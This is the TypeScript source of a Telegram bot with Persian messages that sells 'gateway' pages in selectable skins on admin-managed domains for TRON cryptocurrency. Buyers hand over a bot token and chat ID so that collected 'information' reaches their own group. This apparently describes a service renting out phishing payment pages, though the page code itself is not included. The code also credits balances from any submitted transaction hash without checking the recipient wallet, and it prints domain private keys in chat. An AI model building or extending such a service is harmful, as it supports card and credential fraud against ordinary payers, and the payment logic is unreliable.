const main_token: string = "";
const bot_wallet: string = "";
const admins: number[]   = [];

import { UserDatabase, HashDatabase, DomainDatabase } from "./database";
import telegram from "node-telegram-bot-api";
import { InlineKeyboardButton } from "node-telegram-bot-api";
import { getTransactionByHash } from "./tron";
import * as trxweb from "tronweb";
import * as fs from "fs";
import * as path from "path";
import * as axios from "axios";
const Telegram = require("node-telegram-bot-api");

process.on("uncaughtException", async (uexcept) => {
    console.error(uexcept);
})

process.on("uncaughtExceptionMonitor", async (uexceptmonitor) => {
    console.error(uexceptmonitor);
})

process.on("unhandledRejection", async (unhandle) => {
    console.error(unhandle);
})

const bot: telegram = new Telegram(main_token, { polling: true });
const userdb = new UserDatabase();
const hashdb = new HashDatabase();
const domaindb = new DomainDatabase();
let   price  = parseInt(fs.readFileSync(path.join(__dirname, "price.txt")).toString());
const que    = new Map<number, { domain_id?: string, skin?: string }>();
const got    = new Map<number, string>();
const inf    = new Map<number, { token?: string, chat?: number }>();
const opt    = new Map<number, { domain_id?: string, skin_name?: string }>();
const cns    = new Map<number, { coins: number }>();
const translationTable = {
    'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
    'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
    'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
    'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
    'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
    'm': 'ᴍ'
};

bot.on("message", async (message) => {
    console.log(message);
    if (!message.from) return;
    if (message.chat.type === 'channel') return;
    message.text = message.text ? message.text : "";

    if (message.text.startsWith("/start") || message.text === "درگاه"){
        await userdb.add(message.from.id, (t) => {console.log(t)});
        await domaindb.getDomains(async (domains) => {
            const ghalebs = new Set<string>();
            for (const _d of domains){
                for (const __d of _d.includes){
                    ghalebs.add(__d);
                }
            }

            return await bot.sendMessage(
                message.chat.id,
                `🧽 | ربات خرید درگاه 𝚁 𝙿𝚘𝚛𝚝𝚊𝚕\n\n📁 | قالب: ${ghalebs.size} | دامین: ${domains.length}\n🖥️ | تضمین 3 روز قیمت ${price} ترون\n💰 | ولت بات: <code>${bot_wallet}</code>`,
                {
                    parse_mode: "HTML",
                    reply_to_message_id: message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🪙 خرید 🪙' , callback_data: `buy_${message.from!.id}`}]
                        ]
                    }
                }
            )
        })
    } else if (message.text.startsWith("/help")){
        return bot.sendMessage(
            message.chat.id,
            "/hash <HASH> : شارژ کردن حساب خودتون با ارسال هش تراکنش (فقط واریزی های 24 ساعت قبل قبول میشن)\n/wallet : مقداری که حسابتون شارژ شده\n/cancel : کنسل کردن پروسه",
            {
                reply_to_message_id: message.message_id
            }
        )
    } else if (message.text.startsWith("/wallet")){
        await userdb.getUserById(message.from.id, async (user) => {
            if (!user){
                return await bot.sendMessage(
                    message.chat.id,
                    "اول /start رو بفرست",
                    {
                        reply_to_message_id: message.message_id
                    }
                )
            }

            return await bot.sendMessage(
                message.chat.id,
                `🌀 wallet : ${user.coins}`,
                {
                    reply_to_message_id: message.message_id
                }
            )
        })
    } else if (message.text.startsWith("/cancel")){
        await userdb.getUserById(message.from.id, async (user) => {
            if (!user){
                return await bot.sendMessage(
                    message.chat.id,
                    "اول /start رو بفرست",
                    {
                        reply_to_message_id: message.message_id
                    }
                )
            }
            if (inf.has(message.from!.id)){
                inf.delete(message.from!.id);
            }

            if (got.has(message.from!.id)){
                got.delete(message.from!.id);
            }

            if (que.has(message.from!.id)){
                que.delete(message.from!.id);
            }

            if (opt.has(message.from!.id)){
                opt.delete(message.from!.id);
            }

            return bot.sendMessage(
                message.chat.id,
                `✅ | تمامی پروسه های شما پاک شدند`,
                {
                    reply_to_message_id: message.message_id
                }
            )
        })
    } else if (message.text.startsWith("/hash")){
        await userdb.getUserById(message.from.id, async (user) => {
            if (!user){
                return await bot.sendMessage(
                    message.chat.id,
                    "اول /start رو بفرست",
                    {
                        reply_to_message_id: message.message_id
                    }
                )
            }
            const hash = message.text!.slice(6).trim();
            if (hash.length === 0){
                return bot.sendMessage(
                    message.chat.id,
                    `جلوی /hash هش تراکنش رو ارسال کنید`,
                    {
                        reply_to_message_id: message.message_id
                    }
                )
            } else {
                await hashdb.exists(hash, async (doesExist) => {
                    if (doesExist){
                        return await bot.sendMessage(
                            message.chat.id,
                            `🔴 این هش قبلا ثبت شده`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }

                    await getTransactionByHash(hash).then(async (tx) => {
                        if (tx.tx.Error){
                            return await bot.sendMessage(
                                message.chat.id,
                                `🔴 تراکنش اشتباهه`,
                                {
                                    reply_to_message_id: message.message_id
                                }
                            )
                        }
                        const haspassed = has24HoursPassed(tx.tx.raw_data.timestamp);
                        if (haspassed){
                            return await bot.sendMessage(
                                message.chat.id,
                                `🔴 از تراکنش بیشتر از ۲۴ میگذرد, طبق قوانین درگاه ساز R Portal تراکنش هایی که از ۲۴ ساعت گذشتن ست نمیشن`,
                                {
                                    reply_to_message_id: message.message_id
                                }
                            )
                        } else {
                            const amount = (tx.tx.raw_data.contract[0].parameter.value as any).amount;
                            const real_amount = trxweb.TronWeb.fromSun(amount);
                            if (!real_amount){
                                return await bot.sendMessage(
                                    message.chat.id,
                                    `🔴 مقدار تراکنش غیرقابل دیدن میباشد`,
                                    {
                                        reply_to_message_id: message.message_id
                                    }
                                )
                            } else {
                                await userdb.charge(message.from!.id, Math.floor(parseInt(real_amount.toString())), async (d) => {
                                    if (d.status){
                                        return await bot.sendMessage(
                                            message.chat.id,
                                            `✅ مقدار ${real_amount} حسابت رو شارژ کرد`,
                                            {
                                                reply_to_message_id: message.message_id
                                            }
                                        )
                                    } else {
                                        return await bot.sendMessage(
                                            message.chat.id,
                                            `🔴 ${d.message}`,
                                            {
                                                reply_to_message_id: message.message_id
                                            }
                                        )
                                    }
                                })
                            }
                        }
                    })
                })
            }
        })
    } else if (message.text.startsWith("/admin")){
        if (admins.includes(message.from.id)){
            return await bot.sendMessage(
                message.chat.id,
                "👤 | پنل ادمین",
                {
                    reply_to_message_id: message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: build(`🔺 ban 🔺`), callback_data: `ban_${message.from.id}` }, { text: build('🔹 unban 🔹'), callback_data: `unban_${message.from.id}` }],
                            [{ text: build(`💬 broadcast 💬`), callback_data: `brcast_${message.from.id}` }],
                            [{ text: build(`🔗 add domain 🔗`), callback_data: `adddomain_${message.from.id}` }, { text: build(`✂️ del domain ✂️`), callback_data: `deldomain_${message.from.id}` }],
                            [{ text: build(`🔮 add skin 🔮`), callback_data: `addskin_${message.from.id}` }, { text: build(`🪓 del skin 🪓`), callback_data: `delskin_${message.from.id}` }],
                            [{ text: build(`💰 change price 💰`), callback_data: `changeprice_${message.from.id}` }, { text: build(`🌀 domains 🌀`), callback_data: `cdomains_${message.from.id}` }],
                            [{ text: build(`🪙 free coins 🪙`), callback_data: `freecoins_${message.from.id}` }]
                        ]
                    }
                }
            )
        }
    }

    if (got.has(message.from.id)){
        const userstep = got.get(message.from.id)!;

        if (userstep === "gettoken"){
            if (message.text.length === 0){return;}
            inf.set(message.from.id, { token: message.text });
            got.set(message.from.id, "getchat");
            return await bot.sendMessage(
                message.chat.id,
                "چت آیدی گروهتون جهت ارسال اطلاعات به اونجا رو ارسال کنید",
                {
                    reply_to_message_id: message.message_id
                }
            )
        } else if (userstep === "getchat"){
            if (!/^-?\d+$/.test(message.text)){return;}
            const _inf = inf.get(message.from.id)!;
            _inf.chat = parseInt(message.text);
            inf.set(message.from.id, _inf);
            got.delete(message.from.id);
            const _que = que.get(message.from.id)!;

            que.delete(message.from!.id);
            inf.delete(message.from!.id);

            await domaindb.getDomainByID(_que.domain_id!, async (domain) => {
                let dtype: string;
                if (!domain){
                    return await userdb.charge(message.from!.id, price, async () => {
                        await bot.sendMessage(
                            message.chat.id,
                            "🔴 | دامین از سمت ادمین ها حذف شد, لطفا دامین دیگه ای انتخاب کنید (پول شما برگردانده میشود)",
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    });
                } else {
                    const theurl = new URL(domain.durl);
                    const orgspl = theurl.origin.split(".");
                    dtype = orgspl[orgspl.length - 1];
                }

                await userdb.addPort(message.from!.id, {
                    bought_on: Date.now(),
                    token: _inf.token!,
                    chat: _inf.chat!,
                    type: _que.skin!,
                    domain_type: dtype
                }, async (stat) => {
                    if (!stat.status){
                        return bot.sendMessage(
                            message.chat.id,
                            `🔴 | ${stat.message}`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }

                    await domaindb.addInclude(domain.id, stat.port.name, () => {});
                    await bot.sendMessage(
                        message.chat.id,
                        `✅ پورت با موفقیت در دیتابیس ثبت شد\n\n🖇️ | پورت : <code>${stat.port.name}</code>\n⏳ | خریداری شده در ${new Date()}\n🖇️ | دامین : ${dtype}\n🪄 | قالب : ${_que.skin!}\n💬 | چت : ${_inf.chat!}\n🤖 | توکن : <code>${_inf.token!}</code>\n\n🔮 | یک دقیقه و سی ثانیه صبر کنید تا درگاهتون آنلاین بشه`,
                        {
                            reply_to_message_id: message.message_id,
                            parse_mode: "HTML"
                        }
                    ).then(async () => {
                        setTimeout(async () => {
                            await axios.post(domain.durl + "/add-dargah", { port: stat.port.name, skin: _que.skin!, domain: domain.durl }, {
                                headers: {
                                    "Content-Type": "application/json"
                                }
                            }).then(async (resp) => {
                                console.log(resp.status);
                                console.log(resp.data)
                                const _d = resp.data as any;
                                try {
                                    if (_d.status){
                                        return await bot.sendMessage(
                                            message.chat.id,
                                            `✅ | درگاه آنلاین شد\n\n🖇️ | لینک : ${_d.on}`
                                        )
                                    } else {
                                        return await bot.sendMessage(
                                            message.chat.id,
                                            `🔴 | ${_d.message}`
                                        )
                                    }
                                } catch (e) {
                                    return await bot.sendMessage(
                                        message.chat.id,
                                        `🔴 | ${e}`
                                    )
                                }
                            }).catch(async (e) => {
                                return await bot.sendMessage(
                                    message.chat.id,
                                    `🔴 | ${e}`
                                )
                            })
                        }, 90000)
                    })
                })
            })
        } else if (userstep === "banuser"){
            if (/^\d+$/.test(message.text)){
                got.delete(message.from.id);
                await userdb.ban(parseInt(message.text), async (d) => {
                    return await bot.sendMessage(
                        message.chat.id,
                        `${d.status === true ? '✅' : '🔴'} | ${d.message ?? "کاربر با موفقیت بن شد"}`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                })
            } else {
                await userdb.getUserByPort(message.text, async (user) => {
                    if (!user){
                        return await bot.sendMessage(
                            message.chat.id,
                            `🔴 | کاربر در دیتابیس ثبت نشده`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }

                    await userdb.ban(user.id, async (d) => {
                        return await bot.sendMessage(
                            message.chat.id,
                            `${d.status === true ? '✅' : '🔴'} | ${d.message ?? "کاربر با موفقیت بن شد"}`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    })
                })
            }
        } else if (userstep === "unbanuser"){
            if (/^\d+$/.test(message.text)){
                got.delete(message.from.id);
                await userdb.unban(parseInt(message.text), async (d) => {
                    return await bot.sendMessage(
                        message.chat.id,
                        `${d.status === true ? '✅' : '🔴'} | ${d.message ?? "کاربر با موفقیت بن شد"}`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                })
            } else {
                await userdb.getUserByPort(message.text, async (user) => {
                    if (!user){
                        return await bot.sendMessage(
                            message.chat.id,
                            `🔴 | کاربر در دیتابیس ثبت نشده`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }

                    await userdb.unban(user.id, async (d) => {
                        return await bot.sendMessage(
                            message.chat.id,
                            `${d.status === true ? '✅' : '🔴'} | ${d.message ?? "کاربر با موفقیت آن بن شد"}`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    })
                })
            }
        } else if (userstep === "brdcastmessage"){
            got.delete(message.from.id)
            await bot.sendMessage(
                message.chat.id,
                `کمی صبر ...`,
                {
                    reply_to_message_id: message.message_id
                }
            ).then(async (newMsg) => {
                let _sent_chats: number = 0;
                await userdb.getUsers(async (users) => {
                    const __sents: number[] = [];
                    for (const user of users){
                        if (__sents.includes(user.id)){continue;}
                        __sents.push(user.id);
                        await bot.forwardMessage(user.id, message.chat.id, message.message_id);
                        _sent_chats += 1;
                        for (const up of user.port){
                            if (__sents.includes(up.chat)){continue;}
                            __sents.push(up.chat);
                            await bot.forwardMessage(user.id, up.chat, message.message_id);
                            _sent_chats += 1;
                        }
                    }

                    return await bot.editMessageText(
                        `✅ | پیام به ${_sent_chats} گروه/پیوی ارسال شد`,
                        {
                            chat_id: newMsg.chat.id,
                            message_id: newMsg.message_id
                        }
                    )
                })
            })
        } else if (userstep === "adddomain"){
            if (message.text.length !== 0){
                if (!/^https?:\/\/(?:(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}|\d{1,3}(?:\.\d{1,3}){3})(?::\d{1,5})?(?:\/[^\s]*)?$/.test(message.text)){return;}

                const _url = new URL(message.text);
                const pk = crypto.randomUUID();
                got.delete(message.from.id)
                await domaindb.addDomain(_url.origin, pk, async (data) => {
                    if (data.status){
                        return bot.sendMessage(
                            message.chat.id,
                            `✅ | دامین جدید ست شد\n\n🔗 | لینک : <code>${message.text}</code>\n✏️ | کلید/آیدی : <code>${data.domain.id}</code>\n🪄 | کلید رد و بدل کردن اطلاعات : <code>${pk}</code>`,
                            {
                                reply_to_message_id: message.message_id,
                                parse_mode: "HTML"
                            }
                        )
                    } else {
                        return bot.sendMessage(
                            message.chat.id,
                            `🔴 | ${data.message}`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }
                })
            }
        } else if (userstep === "deldomain"){
            if (message.text.length !== 0){
                if (/^https?:\/\/(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?::\d{1,5})?(?:\/[^\s]*)?$/.test(message.text)){
                    got.delete(message.from.id);
                    const _url = new URL(message.text);
                    await domaindb.getDomainByDURL(_url.origin, async (data) => {
                        if (!data) {
                            return bot.sendMessage(
                                message.chat.id,
                                `🔴 | همچین دامینی وجود نداره`,
                                {
                                    reply_to_message_id: message.message_id
                                }
                            )
                        }

                        await domaindb.removeDomain(data.id, async (datax) => {
                            return await bot.sendMessage(
                                message.chat.id,
                                `${datax.status === true ? '✅' : '🔴'} | ${datax.message ?? "دامین با موفقیت حذف شد"}`,
                                {
                                    reply_to_message_id: message.message_id
                                }
                            )
                        })
                    })
                } else {
                    await domaindb.getDomainByID(message.text, async (data) => {
                        if (!data) {
                            return bot.sendMessage(
                                message.chat.id,
                                `🔴 | همچین دامینی وجود نداره`,
                                {
                                    reply_to_message_id: message.message_id
                                }
                            )
                        }

                        await domaindb.removeDomain(data.id, async (datax) => {
                            return await bot.sendMessage(
                                message.chat.id,
                                `${datax.status === true ? '✅' : '🔴'} | ${datax.message ?? "دامین با موفقیت حذف شد"}`,
                                {
                                    reply_to_message_id: message.message_id
                                }
                            )
                        })
                    })
                }
            }
        } else if (userstep === "addskin"){
            if (message.text.length === 0){return;}
            
            await domaindb.getDomainByID(message.text, async (dom) => {
                if (!dom){
                    return await bot.sendMessage(
                        message.chat.id,
                        `🔴 دامین اشتباه هست`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else {
                    opt.set(message.from!.id, { domain_id: message.text });
                    got.set(message.from!.id, "getskinnameforadd");
                    return await bot.sendMessage(
                        message.chat.id,
                        `اسم قالب رو ارسال کنید (به همراه پسوند)`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            })
        } else if (userstep === "getskinnameforadd"){
            if (message.text.length === 0){return;}

            await domaindb.getDomainByID(opt.get(message.from.id)!.domain_id!, async (dom) => {
                if (!dom){
                    return await bot.sendMessage(
                        message.chat.id,
                        `🔴 دامین حذف شده`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else {
                    const xpath = path.parse(message.text!);
                    if (dom.contains.includes(xpath.name)){
                        return await bot.sendMessage(
                            message.chat.id,
                            `🔴 این قالب قبلا ست شده`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }

                    await domaindb.addContainer(xpath.name, dom.id, async () => {})

                    got.delete(message.from!.id);
                    opt.delete(message.from!.id);

                    return await bot.sendMessage(
                        message.chat.id,
                        `✅ قالب با موفقیت اضافه شد`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            })
        } else if (userstep === "delskin"){
            if (message.text.length === 0){return;}
            
            await domaindb.getDomainByID(message.text, async (dom) => {
                if (!dom){
                    return await bot.sendMessage(
                        message.chat.id,
                        `🔴 دامین اشتباه هست`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else {
                    opt.set(message.from!.id, { domain_id: message.text });
                    got.set(message.from!.id, "getskinnamefordel");
                    return await bot.sendMessage(
                        message.chat.id,
                        `اسم قالب رو ارسال کنید (بدون پسوند)`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            })
        } else if (userstep === "getskinnamefordel"){
            if (message.text.length === 0){return;}

            await domaindb.getDomainByID(opt.get(message.from.id)!.domain_id!, async (dom) => {
                if (!dom){
                    return await bot.sendMessage(
                        message.chat.id,
                        `🔴 دامین حذف شده`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else {
                    const xpath = path.parse(message.text!);
                    if (!dom.contains.includes(xpath.name)){
                        return await bot.sendMessage(
                            message.chat.id,
                            `🔴 قالبی با این اسم وجود نداره`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }

                    await domaindb.removeContainer(xpath.name, dom.id, async () => {})
                    await axios.post(dom.durl + "/remove-skin", { skin: xpath.name }).then(() => {});

                    got.delete(message.from!.id);
                    opt.delete(message.from!.id);

                    return await bot.sendMessage(
                        message.chat.id,
                        `✅ قالب با موفقیت حذف شد`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            })
        } else if (userstep === "changeprice"){
            if (!/^\d+$/.test(message.text)){return;}
            got.delete(message.from!.id);
            price = parseInt(message.text);
            await fs.promises.writeFile(path.join(__dirname, "price.txt"), `${price}`, { flag: 'w' }).then(async () => {
                return await bot.sendMessage(
                    message.chat.id,
                    `✅ قیمت درگاه ها به ${message.text} تغییر یافت`,
                    {
                        reply_to_message_id: message.message_id
                    }
                )
            }).catch(async (e) => {
                return await bot.sendMessage(
                    message.chat.id,
                    `🔴 ${e}`,
                    {
                        reply_to_message_id: message.message_id
                    }
                )
            })
        } else if (userstep === "freecoins"){
            if (!/^\d+$/.test(message.text)){return;}
            got.set(message.from.id, "getuserffreecoins");
            cns.set(message.from.id, { coins: parseInt(message.text) });
            return await bot.sendMessage(
                message.chat.id,
                `👤 آیدی عددی فرد مورد نظر رو ارسال کنید`,
                {
                    reply_to_message_id: message.message_id
                }
            )
        } else if (userstep === "getuserffreecoins"){
            if (!/^\d+$/.test(message.text)){return;}
            if (!cns.has(message.from.id)){
                return await bot.sendMessage(
                    message.chat.id,
                    `🔴 پروسه ای یافت نشد`,
                    {
                        reply_to_message_id: message.message_id
                    }
                )
            }

            const coins = cns.get(message.from.id);
            cns.delete(message.from.id);
            await userdb.charge(message.from.id, coins!.coins, async (datax) => {
                return await bot.sendMessage(
                    message.chat.id,
                    `${datax.status === true ? '✅' : '🔴'} | ${datax.message ?? `${message.text} سکه ریخته شد`}`,
                    {
                        reply_to_message_id: message.message_id
                    }
                )
            })
        }
    }
})

bot.on("callback_query", async (call) => {
    if (!call.from) return;
    if (!call.data) return;
    if (!call.message) return;
    const real_message = call.message;
    const spl = call.data.split("_") ?? [];
    const uid = parseInt(spl[1]);
    const mode = spl[0];

    if (call.from.id === uid){
        switch (mode) {
            // case "buy":
            //     await userdb.getUserById(call.from.id, async (user) => {
            //         if (!user){
            //             return await bot.answerCallbackQuery(
            //                 call.id,
            //                 {
            //                     text: "اول بات رو استارت کنید",
            //                     show_alert: true
            //                 }
            //             )
            //         }

            //         if (user.ban){
            //             return await bot.answerCallbackQuery(
            //                 call.id,
            //                 {
            //                     text: "متاسفانه شما بن شده اید",
            //                     show_alert: true
            //                 }
            //             )
            //         }

            //         domaindb.getDomains(async (domains) => {
            //             const _endpoints = new Map<string, { endpoint: string, href: string }>();

            //             if (que.has(call.from.id)){
            //                 que.delete(call.from.id);
            //             }

            //             for (const _dom of domains){
            //                 const theurl = new URL(_dom.durl);
            //                 const orgspl = theurl.origin.split(".");
            //                 _endpoints.set(_dom.id, { endpoint: orgspl[orgspl.length - 1], href: theurl.href });
            //             }

            //             const thok: InlineKeyboardButton[] = [];

            //             for (const _k of _endpoints.entries()){
            //                 thok.push({ text: _k[1].endpoint, callback_data: `add_${call.from.id}_${_k[0]}` });
            //             }

            //             const chunked = chunkArray(Array.from(thok), 2);
            //             console.log("domains:", domains);
            //             console.log("endpointsMapBeforeLoop:", _endpoints.size);
            //             await bot.editMessageText(
            //                 `🪒 | دریافت درگاه های موجود\n\n⚠️ | چون بات به api وصله قیمت ها ذره ای کمتر قبول نمیشن, پس کامل پول رو واریز کنید`,
            //                 {
            //                     chat_id: real_message.chat.id,
            //                     message_id: real_message.message_id,
            //                     reply_markup: {
            //                         inline_keyboard: chunked
            //                     }
            //                 }
            //             )
            //         })
            //     })
            //     break;

            case "buy":
                userdb.getUserById(call.from.id, (user) => {
                    if (!user) {
                        return bot.answerCallbackQuery(call.id, {
                            text: "اول بات رو استارت کنید",
                            show_alert: true
                        });
                    }

                    if (user.ban) {
                        return bot.answerCallbackQuery(call.id, {
                            text: "متاسفانه شما بن شده اید",
                            show_alert: true
                        });
                    }

                    domaindb.getDomains((domains) => {
                        const _endpoints = new Map<string, { endpoint: string, href: string }>();

                        if (que.has(call.from.id)) {
                            que.delete(call.from.id);
                        }

                        for (const _dom of domains) {
                            try {
                                const theurl = new URL(_dom.durl);
                                const orgspl = theurl.origin.split(".");
                                _endpoints.set(_dom.id, {
                                    endpoint: orgspl[orgspl.length - 1],
                                    href: theurl.href
                                });
                            } catch (err) {
                                console.error("Invalid URL:", _dom.durl, err);
                            }
                        }

                        const thok: InlineKeyboardButton[] = [];

                        _endpoints.forEach((info, _id) => {
                            thok.push({
                                text: info.endpoint.length !== 0 ? info.endpoint : info.href,
                                callback_data: `add_${call.from.id}_${_id}`
                            });
                        });

                        const chunked = chunkArray(thok, 2);

                        bot.editMessageText(
                            `🪒 | دریافت درگاه های موجود\n\n⚠️ | چون بات به api وصله قیمت ها ذره ای کمتر قبول نمیشن, پس کامل پول رو واریز کنید`,
                            {
                                chat_id: real_message.chat.id,
                                message_id: real_message.message_id,
                                reply_markup: { inline_keyboard: chunked }
                            }
                        ).catch(err => console.log("EDIT MESSAGE ERROR:", err));
                    });
                });
                break;


            case "add":
                const _domainid = spl[2];

                await userdb.getUserById(call.from.id, async (user) => {
                    if (!user){
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "اول بات رو استارت کنید",
                                show_alert: true
                            }
                        )
                    }

                    if (user.ban){
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "متاسفانه شما بن شده اید",
                                show_alert: true
                            }
                        )
                    }

                    await domaindb.getDomainByID(_domainid, async (dom) => {
                        if (!dom){
                            return await bot.answerCallbackQuery(
                                call.id,
                                {
                                    text: "🔴 دامینی یافت نشد",
                                    show_alert: true
                                }
                            )
                        }

                        que.set(call.from.id, { domain_id: _domainid });
                        const items: InlineKeyboardButton[] = [];
                        for (const inc of dom.contains){
                            items.push({ text: inc, callback_data: `addskinformoshtari_${call.from.id}_${inc}` })
                        }

                        const chuncked = chunkArray(items, 2);

                        return await bot.editMessageText(
                            '🔺 قالبی رو انتخاب کنید',
                            {
                                chat_id: real_message.chat.id,
                                message_id: real_message.message_id,
                                reply_markup: {
                                    inline_keyboard: chuncked
                                }
                            }
                        )
                    })
                })
                break;
            case "addskinformoshtari":
                const skin = spl[2];
                const qdata = que.get(call.from.id)!;
                console.log(qdata)
                qdata.skin = skin;
                que.set(call.from.id, qdata);

                await userdb.getUserById(call.from.id, async (user) => {
                    if (!user){
                        que.delete(call.from.id);
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "اول بات رو استارت کنید",
                                show_alert: true
                            }
                        )
                    }

                    if (user.ban){
                        que.delete(call.from.id);
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "متاسفانه شما بن شده اید",
                                show_alert: true
                            }
                        )
                    }

                    if (user.coins < price){
                        que.delete(call.from.id);
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "حساب شما کافی نیست",
                                show_alert: true
                            }
                        )
                    }

                    await domaindb.getDomainByID(qdata.domain_id!, async (domain) => {
                        if (!domain){
                            return await bot.answerCallbackQuery(
                                call.id,
                                {
                                    text: "🔴 دامینی یافت نشد",
                                    show_alert: true
                                }
                            )
                        }

                        await userdb.decharge(call.from.id, price, () => {});
                        got.set(call.from.id, "gettoken");

                        return await bot.editMessageText(
                            "🤖 | توکن ربات جهت ارسال اطلاعات رو ارسال کنید",
                            {
                                chat_id: real_message.chat.id,
                                message_id: real_message.message_id
                            }
                        )
                    })
                })
                break;
            
            case "ban":
                got.set(call.from.id, "banuser");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "آیدی عددی مورد نظر یا پورت مورد نظر رو ارسال کنید",
                        show_alert: true
                    }
                )
                break;
            case "unban":
                got.set(call.from.id, "unbanuser");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "آیدی عددی مورد نظر یا پورت مورد نظر رو ارسال کنید",
                        show_alert: true
                    }
                )
                break;
            case "brcast":
                got.set(call.from.id, "brdcastmessage");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "پیامی رو ارسال کن",
                        show_alert: true
                    }
                )
                break;
            case "adddomain":
                got.set(call.from.id, "adddomain");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "لینک دامین رو ارسال بکن",
                        show_alert: true
                    }
                )
                break;
            case "deldomain":
                got.set(call.from.id, "deldomain");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "لینک دامین یا آیدی دامین رو ارسال بکن",
                        show_alert: true
                    }
                )
                break;
            case "addskin":
                got.set(call.from.id, "addskin");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "آیدی دامین رو ارسال بکن",
                        show_alert: true
                    }
                )
                break;
            case "delskin":
                got.set(call.from.id, "delskin");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "آیدی دامین رو ارسال بکن",
                        show_alert: true
                    }
                )
                break;
            case "changeprice":
                got.set(call.from.id, "changeprice");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "قیمت جدید رو به ترون وارد بکن",
                        show_alert: true
                    }
                )
                break;
            case "freecoins":
                got.set(call.from.id, "freecoins");
                await bot.answerCallbackQuery(
                    call.id,
                    {
                        text: "مقدار سکه هایی که حساب رو شارژ کنه",
                        show_alert: true
                    }
                )
                break;
            case "cdomains":
                await domaindb.getDomains(async (domains) => {
                    let txt = `📃 | تعداد دامین ها : ${domains.length}\n`;
                    
                    for (const domain of domains){
                        domain.contains = domain.contains.length === 0 ? [] : domain.contains;
                        domain.includes = domain.includes.length === 0 ? [] : domain.includes;
                        console.log(typeof domain.includes);
                        txt += `\n🔗 | لینک : <code>${domain.durl}</code>\n📦 | قالب ها [ ${domain.contains.length} ] : ${domain.contains.map(cnt => `<code>${cnt}</code>`).join(", ")}\n🌀 | پورت های متصل [ ${domain.includes.length} ] : ${domain.includes.map(inc => `<code>${inc}</code>`).join(", ")}\n🔮 | آیدی : <code>${domain.id}</code>\n✏️ | private key : <code>${domain.private_key}</code>\n`;
                    }

                    const _chunk = safeTelegramChunk(txt, 4090);

                    for (const ch of _chunk){
                        await bot.sendMessage(
                            real_message.chat.id,
                            ch,
                            {
                                parse_mode: "HTML",
                                reply_to_message_id: real_message.message_id
                            }
                        )
                    }
                })
                break;
        }
    }
})

function build(string: string) {
    return string.split('').map(char => translationTable[char] || char).join('');
}

function daysToMilliseconds(days: number): number {
    const millisecondsInADay = 24 * 60 * 60 * 1000;
    return days * millisecondsInADay;
}

function chunkArray<T>(array: T[], chunkSize: number): T[][] {
    const result: T[][] = [];
    
    for (let i = 0; i < array.length; i += chunkSize) {
        const chunk = array.slice(i, i + chunkSize);
        result.push(chunk);
    }
    
    return result;
}

function has24HoursPassed(timestamp) {
  const now = Date.now();
  const diff = now - timestamp;
  return diff >= 24 * 60 * 60 * 1000;
}

function safeTelegramChunk(text: string, max = 4000): string[] {
    const chunks: string[] = [];
    let current = "";

    const pushChunk = () => {
        if (current.trim().length > 0) chunks.push(current);
        current = "";
    };

    const lines = text.split("\n");

    for (const line of lines) {
        if ((current + line + "\n").length > max) {
            pushChunk();
        }
        current += line + "\n";
    }

    if (current.length > 0) pushChunk();

    return chunks;
}
